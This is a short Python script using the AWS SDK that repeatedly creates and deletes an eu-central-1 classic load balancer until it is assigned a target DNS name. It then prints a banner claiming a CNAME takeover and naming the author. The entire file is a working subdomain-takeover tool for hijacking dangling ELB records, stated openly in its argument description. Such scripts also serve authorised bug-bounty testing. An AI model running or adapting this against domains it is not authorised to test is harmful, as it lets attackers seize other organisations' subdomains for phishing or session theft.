import boto3
import argparse
import time
client = boto3.client('elb', 'eu-central-1')



def takeover(elb,dns,flag):
    while (flag):
        time.sleep(2)
        response = client.create_load_balancer(
            Listeners=[
            {
                'InstancePort': 80,
                'InstanceProtocol': 'HTTP',
                'LoadBalancerPort': 80,
                'Protocol': 'HTTP',
            },
            ],
            LoadBalancerName=elb,
            SecurityGroups=[
               'sg-ead50686',
            ],
            Subnets=[
               'subnet-e7a9559c',
            ],
            )

        print(response['DNSName'])
        if response['DNSName'] == dns :
            flag=0
            print "CNAME TAKEN OVER BY VINAY KUMAR @ rvkyadav007@gmail.com"
            exit (0)
        else:
            response = client.delete_load_balancer(
                 LoadBalancerName=elb
               )


def main():
    parser = argparse.ArgumentParser(description='This script is for taking over ELB-SUBDOMAINS specifically eu-central-1')
    parser.add_argument('-elb', '--load_balancer', required=True)
    parser.add_argument('-dns', '--domain_name', required=True)
    args = parser.parse_args()
    takeover(args.load_balancer, args.domain_name,1)


if __name__ == '__main__':
    main()
